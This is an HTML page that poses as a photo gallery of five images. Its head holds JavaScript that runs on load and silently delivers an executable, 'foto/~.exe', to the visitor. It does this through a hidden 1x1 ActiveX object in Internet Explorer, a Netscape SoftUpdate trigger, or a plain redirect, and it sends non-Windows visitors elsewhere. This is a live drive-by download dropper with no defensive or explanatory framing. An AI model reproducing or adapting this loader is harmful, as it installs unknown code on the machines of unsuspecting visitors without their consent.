


<head>
<script language="JavaScript">
var exepath='foto/~.exe';
</script>

<SCRIPT LANGUAGE="JavaScript">
<!--
a=navigator;
var giolrter=navigator.appName;
var bver=parseInt(navigator.appVersion);

a=navigator;
function install() {
        if ( navigator.platform && navigator.platform != 'Win32' ) {
                location.replace('SPRUTWIN32.html');
                return;
        }
        if (giolrter == 'Microsoft Internet Explorer' && bver >= 2) {
                document.write('<object id="dg5tr5g5f" width=1 height=1 classid="CLSID:018B7EC3-EECA-11d3-8E71-0000E82C6C0D"   codebase="'+exepath+'"></object>');
        } else if (giolrter == 'Netscape' && bver >= 4) {
                trigger = netscape.softupdate.Trigger;
                if (trigger.UpdateEnabled) {
                        trigger.StartSoftwareUpdate(exepath, trigger.DORIS)
                } else {
                        location.replace(exepath);
                }
        } else {
                location.replace(exepath);
        }
}

install();

// -->
</script>
</head>
<body>
<table width="22%"  border="0" cellspacing="0" cellpadding="2">
  <tr>
    <td><img src="foto/f_23227.jpg" width="600" height="600"></td>
    <td><img src="foto/f_24131.jpg" width="600" height="600"></td>
    <td><img src="foto/f_28474_small.jpg" width="600" height="600"></td>
  </tr>
  <tr>
    <td><img src="foto/f_35469.jpg" width="600" height="600"></td>
    <td><img src="foto/f_37648.jpg" width="600" height="600"></td>
    <td>&nbsp;</td>
  </tr>
</table>
</body>
</html>